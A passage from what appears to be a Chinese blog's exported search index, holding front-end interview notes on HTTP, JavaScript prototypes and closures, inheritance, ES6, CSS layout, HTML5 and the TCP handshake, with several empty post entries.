相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 ] 详细版： 1、浏览器会开启一个线程来处理这个请求，对 URL 分析判断如果是 http 协议就按照 Web 方式来处理; 2、调用浏览器内核中的对应方法，比如 WebView 中的 loadUrl 方法; 3、通过DNS解析获取网址的IP地址，设置 UA 等信息发出第二个GET请求; 4、进行HTTP协议会话，客户端发送报头(请求报头); 5、进入到web服务器上的 Web Server，如 Apache、Tomcat、Node.JS 等服务器; 6、进入部署好的后端应用，如 PHP、Java、JavaScript、Python 等，找到对应的请求处理; 7、处理结束回馈报头，此处如果浏览器访问过，缓存上有对应资源，会与服务器最后修改时间对比，一致则返回304; 8、浏览器开始下载html文档(响应报头，状态码200)，同时使用缓存; 9、文档树建立，根据标记请求所需指定MIME类型的文件（比如css、js）,同时设置了cookie; 10、页面开始渲染DOM，JS根据DOM API操作DOM,执行事件绑定等，页面显示完成。 简洁版： 浏览器根据请求的URL交给DNS域名解析，找到真实IP，向服务器发起请求； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。 部分地区用户反应网站很卡，请问有哪些可能性的原因，以及解决方法？ 从打开app到刷新出内容，整个过程中都发生了什么，如果感觉慢，怎么定位问题，怎么解决?第一次访问页面中时弹出引导，用户关闭引导，之后再次进入页面时不希望出现引导，如何实现？localStorage 除了前端以外还了解什么其它技术么？你最最厉害的技能是什么？你用的得心应手用的熟练地编辑器&amp;开发环境是什么样子？ Sublime Text 3 + 插件 Google chrome 查看页面UI、动画效果和交互功能，Firebug 兼容测试和 Node.js + webpack Git 版本控制和Code Review 对前端工程师这个职位是怎么样理解的？它的前景会怎么样？ 前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。 1、实现界面交互 2、提升用户体验 3、有了Node.js，前端可以实现服务端的一些事情 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好， 参与项目，快速高质量完成实现效果图，精确到1px； 与团队成员，UI设计，产品经理的沟通； 做好的页面结构，页面重构和用户体验； 处理hack，兼容、写出优美的代码格式； 针对服务器的优化、拥抱最新前端技术。 你怎么看待Web App 、hybrid App、Native App？你移动端前端开发的理解？（和 Web 前端开发的主要区别是什么？）产品进行版本升级时，可能发生不兼容性问题，如何提前预防和解决？ 非覆盖式发布，API新增而不是在原来的上面修改； 提前做好 @Deprecated的版本提示； 你对加班的看法？ 加班就像借钱，原则应当是——救急不救穷 平时如何管理你的项目？ 先期团队必须确定好全局样式（global.css），编码模式(utf-8) 等； 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）； 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）； 页面进行标注（例如 页面 模块 开始和结束）； CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）； JS 分文件夹存放 命名以该JS功能为准的英文翻译。 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理 如何设计突发大规模并发架构？当团队人手不足，把功能代码写完已经需要加班的情况下，你会做前端代码的测试吗？说说最近最流行的一些东西吧？常去哪些网站？ES6\WebAssembly\Node\MVVM\Web Components\React\React Native\Webpack 组件化 知道什么是SEO并且怎么优化么? 知道各种meta data的含义么?移动端（Android IOS）怎么做好用户体验? 清晰的视觉纵线、 信息的分组、极致的减法、 利用选择代替输入、 标签及文字的排布方式、 依靠明文确认密码、 合理的键盘利用、 简单描述一下你做过的移动APP项目研发流程？你在现在的团队处于什么样的角色，起到了什么明显的作用？你认为怎样才是全端工程师（Full Stack developer）？介绍一个你最得意的作品吧？你有自己的技术博客吗，用了哪些技术？对前端安全有什么看法？是否了解Web注入攻击，说下原理，最常见的两种攻击（XSS 和 CSRF）了解到什么程度？项目中遇到国哪些印象深刻的技术难题，具体是什么问题，怎么解决？。最近在学什么东西？你的优点是什么？缺点是什么？如何管理前端团队?最近在学什么？能谈谈你未来3，5年给自己的规划吗？前端学习网站推荐 极客标签： http://www.gbtags.com/ 码农周刊： http://weekly.manong.io/issues/ 前端周刊： http://www.feweekly.com/issues 慕课网： http://www.imooc.com/ div.io： http://div.io Hacker News： https://news.ycombinator.com/news InfoQ： http://www.infoq.com/ w3cplus： http://www.w3cplus.com/ Stack Overflow： http://stackoverflow.com/ 10.w3school： http://www.w3school.com.cn/ 11.mozilla： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript文档推荐jQuery 基本原理 JavaScript 秘密花园 CSS参考手册 JavaScript 标准参考教程 ECMAScript 6入门]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>JavaScript专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-Vue专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-Vue%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[常见面试题详解-HTML专题]]></title>
    <url>%2F2018%2F08%2F28%2F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[JavaScript中的深拷贝与浅拷贝。浅拷贝：只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存（内存区域没有隔离）。深拷贝：会另外创造一个一模一样的对象，新对象跟原对象不共享内存（内存区域隔离），修改新对象不会改到原对象。在多层对象上，浅拷贝只拷贝一层。 盒子模型盒子模型包括四部分：内容（content）、填充（padding）、边框（border）、边界（margin）盒子模型可以分为两种：IE盒子模型和W3C标准盒子模型区别：两者对于width的计算方式不同，前者width=border+padding+内容宽度，后者width=内容宽度。 在JSONP中服务器返回给客户端都可能是什么格式的？JSONP的原理是服务器端把我传过去的函数名和数据拼接到一起，按照理论上来说，它可以返回任何它想要返回的格式。例如：普通格式字符串，JSON格式字符串 数字格式字符串，xml格式字符串，一般返回的都是JSON格式的字符串 一个页面从URL到加载显示完成，都发生了什么？①通过DNS将该地址解析成IP地址；②发起网络连接，进行http协议会话：客户端发送报头（请求报头），服务端回馈报头（响应报头）③返回一个页面（根据页面上的外链的URL重新发送请求获取）④接收文件完毕，对加载到的资源进行语法解析，以及相应的内部数据结构（网页渲染） MVVM框架的优点：1、方便测试在MVC下，Controller基本是无法测试的，里面混杂了个各种逻辑，而且分散在不同的地方。有了MVVM我们就可以测试里面的viewModel，来验证我们的处理结果对不对。2、便于代码的移植可以把一些视图逻辑放在一个ViewModel里面，让很多view重用这段视图逻辑。比如iOS里面有iPhone版本和iPad版本，除了交互展示不一样外，业务逻辑的model是一致的。这样，我们就可以以很小的代价去开发另一个app。3、独立开发开发人员可以专注于业务逻辑和数据的开发（ViewModel），设计人员可以专注于页面设计，使用Expression Blend可以很容易设计界面并生成xml代码。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue中的指令]]></title>
    <url>%2F2018%2F08%2F28%2FVue%E4%B8%AD%E7%9A%84%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Vue中双向数据绑定的原理]]></title>
    <url>%2F2018%2F08%2F28%2FVue%E4%B8%AD%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%9A%84%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[什么是MVVM，MVC和MVVM的区别，MVVM框架VUE实现原理]]></title>
    <url>%2F2018%2F08%2F28%2F%E4%BB%80%E4%B9%88%E6%98%AFMVVM%EF%BC%8CMVC%E5%92%8CMVVM%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8CMVVM%E6%A1%86%E6%9E%B6VUE%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[天气小程序开发笔记]]></title>
    <url>%2F2018%2F08%2F28%2F%E5%A4%A9%E6%B0%94%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[小程序开发基础知识准备工作小程序开发要先注册小程序账号，有了小程序账号才可以使用开发者工具。小程序是一种特殊的开发形式，里面的 API 和组件都是自己定制的，因此在普通的浏览器中不能预览，要预览功能和页面就需要使用开发者工具。 注册小程序账号]]></content>
      <categories>
        <category>小程序</category>
      </categories>
      <tags>
        <tag>小程序</tag>
        <tag>天气</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深拷贝与浅拷贝的区别]]></title>
    <url>%2F2018%2F08%2F28%2F%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[数组常见方法的使用及其封装]]></title>
    <url>%2F2018%2F08%2F26%2F%E6%95%B0%E7%BB%84%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%B6%E5%B0%81%E8%A3%85%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[JS中插件、组件、类库、框架的区别]]></title>
    <url>%2F2018%2F08%2F26%2FJS%E4%B8%AD%E6%8F%92%E4%BB%B6%E3%80%81%E7%BB%84%E4%BB%B6%E3%80%81%E7%B1%BB%E5%BA%93%E3%80%81%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[前端经典面试题]]></title>
    <url>%2F2018%2F08%2F21%2F%E5%89%8D%E7%AB%AF%E7%BB%8F%E5%85%B8%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[JavaScript原型我们创建的每一个函数，都可以有一个prototype属性，该属性指向一个对象。这个对象，就是原型。 当我们在创建对象时，可以根据自己的需求，选择性的将一些属性和方法通过prototype属性，挂载在原型对象上。而每一个new出来的实例，都有一个proto属性，该属性指向构造函数的原型对象，通过这个属性，让实例对象也能够访问原型对象上的方法。因此，当所有的实例都能够通过proto访问到原型对象时，原型对象的方法与属性就变成了共有方法与属性。// 声明构造函数 123function Person(name, age) &#123; this.name = name; this.age = age; &#125; // 通过prototye属性，将方法挂载到原型对象上 123456Person.prototype.getName = function() &#123; return this.name; &#125;var p1 = new Person('tim', 10); var p2 = new Person('jak', 22);console.log(p1.getName === p2.getName); // true 通过图示我们可以看出，构造函数的prototype与所有实例对象的proto都指向原型对象。而原型对象的constructor指向构造函数。 原型链我们知道所有的函数都有一个叫做toString的方法。那么这个方法到底是在哪里的呢？ 先随意声明一个函数： 1function foo() &#123;&#125; 其中foo是Function对象的实例。而Function的原型对象同时又是Object的实例。这样就构成了一条原型链。原型链的访问，其实跟作用域链有很大的相似之处，他们都是一次单向的查找过程。因此实例对象能够通过原型链，访问到处于原型链上对象的所有属性与方法。这也是foo最终能够访问到处于Object原型对象上的toString方法的原因。 作用域链作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的。 闭包第一种理解(红宝书)是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量。 第二种理解(你不知道的JavaScript)当函数可以记住并访问所在的词法作用域时，就产生了闭包，这个函数持有对该词法作用域的引用，这个引用就叫做闭包。 闭包的本质闭包本质还是函数，只不过这个函数绑定了上下文环境（函数内部引用的所有变量）。 闭包的缺点常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。 闭包的作用(使用场景)可以用来管理私有变量和私有方法，将对变量（状态）的变化封装在安全的环境中，使得这些变量不能被外部随意修改，同时又可以通过指定的函数接口来操作。 闭包有三个特性 函数嵌套函数 函数内部可以引用外部的参数和变量 参数和变量不会被垃圾回收机制回收作用域JavaScript的作用域就是词法作用域而不是动态作用域； 词法作用域最重要的特征是它的定义过程发生在代码的书写阶段； 动态作用域的作用域链是基于调用栈的 词法作用域的作用域链是基于代码中的作用域嵌套。thisJavaScript的this总是指向一个对象，而具体指向哪个对象是在运行时基于函数的执行环境动态绑定的，而非函数被声明时的环境。this指向作为普通函数调用（this指向全局对象window对象） 作为对象的方法调用（this指向该对象） 构造器调用（this指向用new返回的这个对象） call、apply、bind的调用（this指向第一个参数对象）高阶函数函数作为参数传递 函数作为返回值输出new操作符具体干了什么呢?创建一个新对象； 将构造函数的作用域赋给新对象（因此this就指向了这个新对象）； 执行构造函数中的代码（为这个新对象添加属性） 返回新对象继承简单原型链继承 123456function Super()&#123; this.name = 'hzzly'; &#125; function Sub()&#123; &#125; // ... Sub.prototype = new Super(); Sub.prototype = new Super();//核心 缺点： 修改sub1.name后sub2.name也变了，因为来自原型对象的引用属性是所有实例共享的。 构造函数式继承：123456789function Super(val)&#123; this.val = val; this.fun = function()&#123; // 实例函数 // ... &#125; &#125;function Sub(val)&#123; Super.call(this, val); // 核心 // ... &#125; //缺点： 无法实现函数复用，每个子类实例都持有一个新的fun函数，太多了就会影响性能，内存爆炸。 组合式继承123456789function Super()&#123; this.name = 'hzzly'; &#125;// 原型函数 Super.prototype.fun1 = function()&#123;&#125;; Super.prototype.fun2 = function()&#123;&#125;; //Super.prototype.fun3...function Sub()&#123; Super.call(this); // 核心 // ... &#125;Sub.prototype = new Super(); // 核心 缺点： 子类原型上有一份多余的父类实例属性，因为父类构造函数被调用了两次，生成了两份，而子类实例上的那一份屏蔽了子类原型上父类的。又是内存浪费。 寄生组合式继承123456789101112function Super()&#123; this.name = 'hzzly'; &#125;Super.prototype.fun1 = function()&#123;&#125;; Super.prototype.fun2 = function()&#123;&#125;; //Super.prototype.fun3...function Sub()&#123; Super.call(this); // 核心 // ... &#125;Sub.prototype=Object.create(Super.prototype) // 核心 Sub.prototype.constructor=Sub // 核心 es6的class继承方式class A &#123; &#125; class B extends A &#123; &#125; B.proto === A // true B.prototype.proto === A.prototype // true es6引入了class、extends、super、static(部分为ES2016标准) null和undefined的区别null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。 undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。 null表示”没有对象”，即该处不应该有值。 call、apply、bind的区别三者都是用来改变函数的this对象的指向的。 三者第一个参数都是this要指向的对象，也就是想指定的上下文。 call 传入的参数数量不固定，第二部分参数要一个一个传，用，隔开。 apply 接受两个参数，第二个参数为一个带下标的集合，可以为数组，也可以为类数组。 bind 是返回一个改变了上下文的函数副本，便于稍后调用；apply 、call 则是立即调用。 本地存储 sessionStorage和localStorage的区别本地存储 sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。 localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 cookie 和session的区别cookie数据存放在客户的浏览器上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用COOKIE。 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。每次请求一个新的页面的时候Cookie都会被发送过去，与服务器进行交互。 XML和JSON的区别？数据体积方面：JSON相对于XML来讲，数据的体积小，传递的速度更快些。 列表项目：JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。 数据描述方面：JSON对数据的描述性比XML较差。 传输速度方面：JSON的速度要远远快于XML。 如何实现浏览器内多个标签页之间的通信?调用localstorge、cookies等本地存储方式 线程与进程的区别一个程序至少有一个进程,一个进程至少有一个线程。 线程的划分尺度小于进程，使得多线程程序的并发性高。 进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。 渐进增强和优雅降级渐进增强：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。 性能优化网页内容 减少 http请求次数 减少 DNS查询次数 避免页面跳转 缓存 Ajax 延迟加载 提前加载 减少 DOM元素数量 避免 404 服务器 使用CDN(内容分发网络) 添加Expires或Cache-Control报文头 Gzip压缩传输文件 CSS 将样式表置顶 用代替@import JavaScript 把脚本置于页面底部 使用外部JavaScript和CSS 精简JavaScript和CSS 去除重复脚本 减少DOM访问 图片 优化图像 优化CSS Spirite 不要在HTML中缩放图片 favicon.ico要小而且可缓存 如何解决跨域问题?jsonp CORS document.domain+iframe window.name window.postMessage jsonp的原理是动态插入script标签 请解释一下 JavaScript 的同源策略这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。指一段脚本只能读取来自同一来源的窗口和文档的属性。 哪些操作会造成内存泄漏？内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） Javascript垃圾回收方法标记清除：这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。 引用计数：引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件。阻止冒泡：ev.stopPropagation() 说说严格模式的限制变量必须声明后再使用 函数的参数不能有同名属性，否则报错 禁止this指向全局对象 不能使用with语句 增加了保留字 arguments不会自动反映函数参数的变化 设立”严格模式”的目的：消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。 请解释什么是事件代理事件代理（Event Delegation），又称之为事件委托。即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能。 Event Loop、消息队列、事件轮询异步函数在执行结束后，会在事件队列中添加一个事件（回调函数）(遵循先进先出原则)，主线程中的代码执行完毕后（即一次循环结束），下一次循环开始就在事件队列中“读取”事件，然后调用它所对应的回调函数。这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环） 主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码（同步任务）调用各种外部API，它们在”任务队列”中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取”任务队列”，依次执行那些事件所对应的回调函数。 执行栈中的代码（同步任务），总是在读取”任务队列”（异步任务）之前执行。 缓存浏览器缓存（Browser Caching）是浏览器端保存数据用于快速读取或避免重复资源请求的优化机制，有效的缓存使用可以避免重复的网络请求和浏览器快速地读取本地数据。 http缓存：http缓存是基于HTTP协议的浏览器文件级缓存机制。即针对文件的重复请求情况下，浏览器可以根据协议头判断从服务器端请求文件还是从本地读取文件判断expires，如果未过期，直接读取http缓存文件 indexDB：是一个在客户端存储可观数量的结构化数据,并且为这些数据添加索引进行高性能检索。 cookie：指一般网站为了辨别用户身份、储存在用户本地终端上的数据（通常经过加密）。cookie一般通过http请求中在头部一起发送到服务器端。一条cookie记录主要由键、值、域、过期时间、大小组成，一般用户保存用户的认证信息。 localstorage：localStorage是h5的一种新的本地缓存方案,加快下次页面打开时的渲染速度,除非主动删除数据，否则数据是永远不会过期的。 sessionstorage：也是h5的一种本地缓存方案，数据的存储仅特定于某个会话中，也就是说数据只保持到浏览器关闭，当浏览器关闭后重新打开这个页面时， 之前的存储已经被清除。 ES6ES6的了解es6是一个新的标准，它包含了许多新的语言特性和库，是JS最实质性的一次升级。比如’箭头函数’、’字符串模板’、’generators(生成器)’、’async/await’、’解构赋值’、’class’等等，还有就是引入module模块的概念。 箭头函数可以让this指向固定化，这种特性很有利于封装回调函数。 (1) 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。 (2) 不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 (3) 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用Rest参数代替。 (4) 不可以使用yield命令，因此箭头函数不能用作Generator函数。 async/await是写异步代码的新方式，以前的方法有回调函数和Promise。async/await是基于Promise实现的，它不能用于普通的回调函数。 async/await与Promise一样，是非阻塞的。 async/await使得异步代码看起来像同步代码，这正是它的魔力所在。 说说你对Promise的理解Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件监听——更合理和更强大。 所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。Promise对象有以下两个特点:对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：Pending（进行中）、Resolved（已完成，又称 Fulfilled）和Rejected（已失败） 一旦状态改变，就不会再变，任何时候都可以得到这个结果 说说你对AMD和Commonjs的理解CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。 Gulp、Webpack比较GulpGulp就是为了规范前端开发流程，实现前后端分离、模块化开发、版本控制、文件合并与压缩、mock数据等功能的一个前端自动化构建工具。 Gulp就像是一个产品的流水线，整个产品从无到有，都要受流水线的控制，在流水线上我们可以对产品进行管理。 Gulp是通过task对整个开发过程进行构建。 Webpack当下最热门的前端资源模块化管理和打包工具 可以很好的管理模块以及各个模块之间的依赖 对js、css、图片等资源文件都支持打包 有独立的配置文件webpack.config.js 可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间 可以生成优化且合并后的静态资源 两大特色： 代码可以自动完成编译 loader 可以处理各种类型的静态文件，并且支持串联操作 CSSdisplay:none和visibility:hidden的区别？display:none 隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。visibility:hidden 隐藏对应的元素，但是在文档布局中仍保留原来的空间。 position:absolute和float属性的异同 A：共同点： 对内联元素设置float和absolute属性，可以让元素脱离文档流，并且可以设置其宽高。 B：不同点： float仍会占据位置，position会覆盖文档流中的其他元素。box-sizing属性 content-box：让元素维持W3C的标准盒模型。元素的宽度/高度由border + padding + content的宽度/高度决定，设置width/height属性指的是content部分的宽/高，一旦修改了元素的边框或内距，就会影响元素的盒子尺寸，就不得不重新计算元素的盒子尺寸，从而影响整个页面的布局。 border-box：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置width/height属性指的是border + padding + content position的值 static 默认值：没有定位，元素出现在正常的流中。 relative：生成相对定位的元素，相对于其在普通流中的位置进行定位。 absolute：生成绝对定位的元素， 相对于最近一级的 定位不是 static 的父元素来进行定位。 fixed：（老IE不支持）生成绝对定位的元素，相对于浏览器窗口进行定位。解释下浮动和它的工作原理？清除浮动的技巧 浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 使用空标签清除浮动：这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。 使用overflow：设置overflow为hidden或者auto，给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。 - 使用after伪对象清除浮动：该方法只适用于非IE浏览器。该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素。 1#box:after&#123; content:"."; height:0; visibility:hidden; display:block; clear:both; &#125; 浮动元素引起的问题父元素的高度无法被撑开，影响与父元素同级的元素 与浮动元素同级的非浮动元素（内联元素）会跟随其后 若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构 CSS3新特性 CSS3实现圆角（border-radius） 阴影（box-shadow） 对文字加特效（text-shadow、） 线性渐变（gradient） 旋转（transform） transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);//旋转,缩放,定位,倾斜 增加了更多的CSS选择器 多背景 rgba 在CSS3中唯一引入的伪元素是::selection. 媒体查询 多栏布局 border-imageCSS spritesCSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用CSS的“background-image”，“background- repeat”，“background-position”的组合进行背景定位，background-position可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了http2。HTML说说你对语义化的理解去掉或者丢失样式的时候能够让页面呈现出清晰的结构； 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重； 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页； 便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。Doctype作用?严格模式与混杂模式如何区分？它们有何意义? &lt;!DOCTYPE&gt; 告知浏览器的解析器用什么文档标准解析这个文档。 严格模式的排版和 JS 运作模式是以该浏览器支持的最高标准运行。 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 &lt;!DOCTYPE&gt; 不存在或格式不正确会导致文档以混杂模式呈现。你知道多少种Doctype文档类型？该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。 HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。 XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。 Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。HTML与XHTML二者有什么区别 所有的标记都必须要有一个相应的结束标记; 所有标签的元素和属性的名字都必须使用小写; 所有的XML标记都必须合理嵌套; 所有的属性必须用引号””括起来; 把所有&lt;和&amp;特殊符号用编码表示; 给所有属性赋一个值; 不要在注释内容中使“–”; 图片必须有说明文字。html5有哪些新特性语义化更好的内容标签（header,nav,footer,aside,article,section） 音频、视频API(audio,video) 画布(Canvas) API 地理(Geolocation) API 拖拽释放(Drag and drop) API 本地离线存储 表单控件，calendar、date、time、email、url、search计算机网络HTTP请求四部分 HTTP请求的方法或动作，比如是get还是post请求； 正在请求的URL（请求的地址）； 请求头，包含一些客户端环境信息、身份验证信息等； 请求体（请求正文），可以包含客户提交的查询字符串信息、表单信息等请求头字段： Accept:text/html,image/*(告诉服务器，浏览器可以接受文本，网页图片) Accept-Charaset:ISO-8859-1 [接受字符编码：iso-8859-1] Accept-Encoding:gzip,compress[可以接受 gzip,compress压缩后数据] Accept-Language:zh-cn[浏览器支持的语言] Host:localhost:8080[浏览器要找的主机] If-Modified-Since:Tue, 09 May 2017 01:34:02 GMT[告诉服务器我这缓存中有这个文件,该文件的时间是…] User-Agent:Nozilla/4.0(Com…)[告诉服务器我的浏览器内核，客户端环境信] Cookie：[身份验证信息] Connection:close/Keep-Alive [保持链接，发完数据后，我不关闭链接] HTTP响应三部分 (1) 一个数字和文字组成的状态码，用来显示请求是成功还是失败； (2) 响应头，响应头也和请求头一样包含许多有用的信息，例如服务器类型、日期时间、内容类型和长度等； (3) 响应体（响应正文）。响应头字段： Cache-Control:[告诉浏览器如何缓存页面(因为浏览器的兼容性最好设置两个)] Connection:close/Keep-Alive [保持链接，发完数据后，我不关闭链接] Content-Type:text/html;charset=gb2312[内容格式和编码] Last-Modified:Tue,11 Juj,2017 18 18:29:20[告诉浏览器该资源上次更新时间是多少] ETag:”540-54f0d59b8b680” Expires:Fri, 26 May 2017 13:28:33 GMT [失效日期] server:apache tomcat nginx [哪种服务器]说说TCP传输的三次握手 第一次握手，客户端给服务器发送数据包（带SYN标志的数据包）。此时服务器确认自己可以接收客户端的包，而客户端不确认服务器是否接收到了自己发的数据包。 第二次握手，服务器端回复（回传一个带有SYN/ACK标志的数据包以示传达确认信息）客户端。此时客户端确认自己发的包被服务器收到，也确认自己可以正常接收服务器包，客户端对此次通信没有疑问了。服务器也可以确认自己能接收到客户端的包，但不能确认客户端能否接收自己发的包。 第三次握手，客户端回复（发送端再回传一个带ACK标志的数据包，代表“握手”结束）服务器。 